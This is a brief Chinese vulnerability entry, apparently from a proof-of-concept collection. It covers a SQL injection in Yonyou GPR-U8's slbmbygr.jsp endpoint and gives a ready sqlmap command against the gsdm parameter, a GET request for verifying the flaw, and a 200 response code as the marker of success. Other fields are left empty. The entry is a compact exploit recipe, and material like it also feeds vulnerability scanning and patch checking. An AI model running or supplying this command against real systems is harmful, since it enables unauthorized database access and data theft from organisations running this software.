﻿# 用友GPR-U8 slbmbygr SQL注入漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：sqlmap -u http://ip:port/u8qx/slbmbygr.jsp?gsdm=1 --batch

> 漏洞特征：

> 验证脚本：HTTP

```
GET /u8qx/slbmbygr.jsp?gsdm=1 HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：用友GPR-U8 slbmbygr SQL注入漏洞.poc
